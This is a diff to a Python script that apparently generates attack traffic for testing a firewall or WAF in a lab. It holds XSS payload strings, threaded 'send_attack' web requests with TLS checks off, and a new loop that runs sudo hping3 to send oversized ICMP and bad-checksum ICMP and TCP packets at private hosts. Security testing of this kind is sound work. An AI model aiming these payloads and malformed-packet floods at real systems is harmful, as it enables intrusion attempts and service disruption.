@@ -1,7 +1,9 @@
+#!/usr/bin/env python3
 import requests
 import urllib3
 import time
 import random
+import subprocess
 from concurrent.futures import ThreadPoolExecutor
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -16,6 +18,11 @@ VERIFY_TLS = False          # set True if using valid certs
 MAX_WORKERS = 10
 TOTAL_REQUESTS = 200
 LOG_EVERY = 10
+
+# hping targets
+ICMP_TARGETS = ["10.1.10.50", "10.1.10.181"]
+BAD_ICMP_TARGETS = ["10.1.10.50", "10.1.10.181"]
+BAD_TCP_TARGETS = ["10.1.10.50", "10.1.10.181"]
 # ===================================
 
 session = requests.Session()
@@ -29,7 +36,7 @@ SQLI_PAYLOADS = [
 
 XSS_PAYLOADS = [
     "<script>alert('xss')</script>",
-    "\"><script>confirm(1)</script>",
+    "\\\"><script>confirm(1)</script>",
     "<img src=x onerror=alert(1)>",
 ]
 
@@ -112,12 +119,39 @@ def send_attack(i):
         if i % LOG_EVERY == 0:
             print(f"[{i}] Error: {e}")
 
+def run_hping(cmd: str):
+    # wrapper to match `>/dev/null` behavior
+    subprocess.run(
+        cmd,
+        shell=True,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+
+def run_hping_batch():
+    # icmp packet too large
+    for t in ICMP_TARGETS:
+        run_hping(f"sudo hping3 -c 3 -d 65495 --icmp {t}")
+
+    # bad icmp checksum
+    for t in BAD_ICMP_TARGETS:
+        run_hping(f"sudo hping3 -c 7 -b {t}")
+
+    # bad tcp checksum
+    for t in BAD_TCP_TARGETS:
+        run_hping(f"sudo hping3 -S -c 27 -p 80 -b -d 'Meow' {t}")
+
 def main():
     while True:
+        # HTTP/WAF attacks
         with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
             executor.map(send_attack, range(TOTAL_REQUESTS))
-        print("Batch complete, sleeping 3s...")
-        time.sleep(3)
+
+        # L3/L4 hping traffic (roughly once per loop)
+        run_hping_batch()
+
+        print("Batch complete, sleeping 2s...")
+        time.sleep(2)
 
 if __name__ == "__main__":
     main()
